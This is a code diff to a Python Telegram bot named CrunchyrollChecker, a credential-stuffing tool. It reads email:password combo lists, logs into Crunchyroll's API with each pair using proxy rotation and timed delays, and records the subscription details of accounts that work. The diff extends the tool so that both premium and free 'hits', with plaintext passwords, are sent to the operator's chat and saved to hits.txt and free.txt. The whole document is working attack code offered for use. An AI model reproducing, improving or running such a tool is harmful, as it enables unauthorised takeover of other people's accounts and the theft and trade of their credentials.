@@ -108,20 +108,26 @@ class CrunchyrollChecker:
 
             headers = {
                 'authorization': f'Bearer {access_token}',
+                'connection': 'Keep-Alive',
+                'host': 'beta-api.crunchyroll.com',
                 'user-agent': 'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)'
             }
 
-            account_data = session.get('https://beta-api.crunchyroll.com/accounts/v1/me', headers=headers, timeout=15).json()
+            account_response = session.get('https://beta-api.crunchyroll.com/accounts/v1/me', headers=headers, timeout=15)
+            account_data = account_response.json()
+
             email_verified = account_data.get('email_verified', False)
             created = account_data.get('created', '').split('T')[0]
             external_id = account_data.get('external_id')
 
-            products_data = session.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products', headers=headers, timeout=15).json()
+            products_response = session.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products', headers=headers, timeout=15)
+            products_data = products_response.json()
 
             plan = "Free"
             currency = "N/A"
             subscribable = "False"
             free_trial = "False"
+
             if 'items' in products_data and len(products_data['items']) > 0:
                 item = products_data['items'][0]
                 plan = item.get('product', {}).get('sku', 'Unknown')
@@ -129,7 +135,8 @@ class CrunchyrollChecker:
                 subscribable = str(item.get('product', {}).get('is_subscribable', False))
                 free_trial = str(item.get('active_free_trial', False))
 
-            sub_data = session.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}', headers=headers, timeout=15).json()
+            sub_data_response = session.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}', headers=headers, timeout=15)
+            sub_data = sub_data_response.json()
 
             expiry = sub_data.get('next_renewal_date', 'N/A')
             if expiry and 'T' in expiry:
@@ -164,13 +171,12 @@ class CrunchyrollChecker:
                 'country': country
             }
 
-        except Exception:
+        except Exception as e:
             return {'status': 'ERROR', 'email': email}
 
 
 async def send_result(chat_id, result):
-    if result['status'] == 'PREMIUM':
-        capture = f"""
+    capture = f"""
 {'='*70}
 EMAIL: {result['email']}
 PASSWORD: {result['password']}
@@ -188,11 +194,17 @@ COUNTRY: {result.get('country', 'N/A')}
 CHECKED BY: @Cr_chker001_bot
 {'='*70}
 """
+
+    if result['status'] == 'PREMIUM':
         await bot.send_message(chat_id, f"<b>🎯 PREMIUM HIT</b>\n<pre>{capture}</pre>", parse_mode="HTML")
         with open("hits.txt", "a", encoding="utf-8") as f:
             f.write(capture + "\n")
+
     elif result['status'] == 'FREE':
-        await bot.send_message(chat_id, f"🆓 FREE → {result['email']}")
+        await bot.send_message(chat_id, f"<b>🆓 FREE HIT</b>\n<pre>{capture}</pre>", parse_mode="HTML")
+        with open("free.txt", "a", encoding="utf-8") as f:   # also saves free accounts
+            f.write(capture + "\n")
+
     else:
         await bot.send_message(chat_id, f"❌ INVALID → {result['email']}")
 
@@ -208,8 +220,7 @@ async def start(message: types.Message):
         "• Use /check to check accounts\n"
         "• /proxies to load proxy file\n"
         "• Fast mode with proxy rotation\n"
-        "• Premium hits saved to hits.txt with full details\n"
-        "• Extra text in combo lines is automatically ignored"
+        "• Premium & Free hits saved with full details"
     )
 
 
@@ -235,14 +246,13 @@ async def handle(message: types.Message):
         checker.proxies = proxies
         return await message.answer(f"✅ Loaded {len(proxies)} proxies!")
 
-    # Combo checking - for normal text or any document upload (combos.txt)
+    # Combo checking
     if message.document:
         file = await bot.get_file(message.document.file_id)
         content = (await bot.download_file(file.file_path)).read().decode('utf-8', errors='ignore')
     else:
         content = message.text.replace("/check", "").strip()
 
-    # Extract ONLY email:password (ignore all other text/characters)
     lines = []
     for raw in content.splitlines():
         raw = raw.strip()
@@ -263,7 +273,7 @@ async def handle(message: types.Message):
     for line in lines:
         try:
             email, password = line.split(":", 1)
-            result = checker.check(email.strip(), password.strip())
+            result = await checker.check(email.strip(), password.strip())
 
             stats['checked'] += 1
             if result['status'] == 'PREMIUM':
@@ -275,7 +285,7 @@ async def handle(message: types.Message):
 
             await send_result(message.from_user.id, result)
 
-            await asyncio.sleep(1.0 + random.uniform(0.2, 0.6))   # Fast limit
+            await asyncio.sleep(1.0 + random.uniform(0.2, 0.6))
 
         except:
             continue
